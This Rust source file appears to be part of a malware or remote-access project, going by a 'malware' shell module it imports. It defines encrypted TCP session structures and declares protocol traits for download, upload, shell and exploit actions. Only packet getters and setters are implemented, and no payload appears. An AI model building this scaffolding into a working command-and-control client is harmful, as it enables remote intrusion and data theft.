use std::{
    io::Error,
    net::{IpAddr, TcpStream, ToSocketAddrs},
    mem::replace
};

use crate::{
    Application::malware::utils::shell::ShellStream,
    structure::utils::{
        enums::{
            EncryptType,
            HandshakeType,
            Packet,
            ParseError,
        },
        structs::{
            define::EncryptionInfo,
            define::StructStone
        }
    },
    utility::secure::{
        crypto::Crypto,
        utils::{AesGcmSivCrypto, RsaCrypto},
    },
};

pub struct SecureSessionLayer { // 핸드세이크, 암호화 통신 구조가 아직 확립되지 않음
    pub(crate) encryption: EncryptionInfo,
    pub(crate) socket: TcpStream,
    pub(crate) recv_packet: Packet,
    pub(crate) send_packet: Packet,
    pub(crate) cipher: Cipher,
}


pub struct Session {
    pub(crate) encryption: EncryptionInfo,
    pub(crate) socket: TcpStream,
    pub(crate) recv_packet: Packet,
    pub(crate) send_packet: Packet,
    pub(crate) cipher: Cipher,
}

pub(crate) struct Cipher {
    pub(crate) aes: AesGcmSivCrypto,
    pub(crate) rsa: RsaCrypto,
}

pub struct ProtocolEditor {
    session: Session,
    exploits: ShellStream,
}

type SResult<T> = std::io::Result<T>;


pub trait PacketProcessing {
    fn save_packet(&mut self, packet: Packet);
    fn peek_packet(&self) -> &Packet;
    fn load_packet(&mut self) -> Packet;
    fn set_packet(&mut self, packet: Packet);
    fn take_packet(&self) -> &Packet;
    fn get_packet(&mut self) -> Packet;
}

pub trait HandleHandShake {

}

pub trait HandleSession {
    fn new<A: ToSocketAddrs>(address: A, packet: Packet) -> Result<(TcpStream,Packet), (Error, Packet)>;
    fn normal(address: IpAddr, packet: Packet) -> Session;
    fn secure(&mut self) -> Session;
    fn establish_connection(address: IpAddr, conn_type: EncryptionInfo, packet: Packet, attempts: u32) -> Session;
    fn optional(address: IpAddr, encryption: EncryptionInfo) -> Session;
    fn is_connected(&self) -> bool;
    fn reconnection(&mut self) -> Result<Session, Error>;
    fn encryption(&mut self) -> Result<(), ParseError>;
    fn decryption(&mut self) -> Result<(), ParseError>;
    fn send(&mut self) -> Result<Packet, Error>;
    fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
    fn receiving(&mut self, buffer: StructStone) -> &Packet;
    fn send_disconnect(&mut self) -> SResult<()>;
}

pub trait HandleProtocols {
    fn response(&mut self, msg: &str) -> SResult<Packet>;
    fn disconnect(&mut self);
    fn download(&mut self) -> SResult<Packet>;
    fn upload(&mut self) -> SResult<Packet>;
    fn exploit(&mut self) -> SResult<Packet>;
}

pub trait Handlers {
    fn default_client_handler(&mut self);
}
impl Session {
    pub fn take_socket(&self) -> &TcpStream {
        &self.socket
    }
    pub fn set(encryption: EncryptionInfo, socket: TcpStream) -> Session {
        let cipher = Cipher { aes: AesGcmSivCrypto::default(), rsa: RsaCrypto::default() };
        Session { encryption, socket,  cipher, recv_packet: Packet::Default, send_packet: Packet::Default }
    }
    pub fn take_handshake_type(&self) -> &HandshakeType {
        &self.encryption.Handshake_Type
    }
    pub fn set_handshake(&mut self, handshake_type: HandshakeType) { self.encryption.Handshake_Type = handshake_type }
    pub fn set_encryption(&mut self, encryption: EncryptionInfo) {
        self.encryption = encryption;
        match self.encryption.Type {
            EncryptType::NoEncryption => {}
            _ => {
                self.cipher.aes.setup().expect("self.aes_cipher.setup()");
                self.cipher.rsa.setup().expect("self.rsa_cipher.setup()");
            }
        }
    }
    pub fn with_send_packet(mut self, packet: Packet) -> Self {
        self.send_packet = packet;
        self
    }

    pub fn with_recv_packet(mut self, packet: Packet) -> Self {
        self.recv_packet = packet;
        self
    }
}

impl PacketProcessing for Session {
    fn save_packet(&mut self, packet: Packet) { self.recv_packet = packet }
    fn peek_packet(&self) -> &Packet { &self.recv_packet }
    fn load_packet(&mut self) -> Packet { replace(&mut self.recv_packet, Packet::Default) }
    fn set_packet(&mut self, packet: Packet) { self.send_packet = packet }
    fn take_packet(&self) -> &Packet { &self.send_packet }
    fn get_packet(&mut self) -> Packet { replace(&mut self.send_packet, Packet::Default) }
}
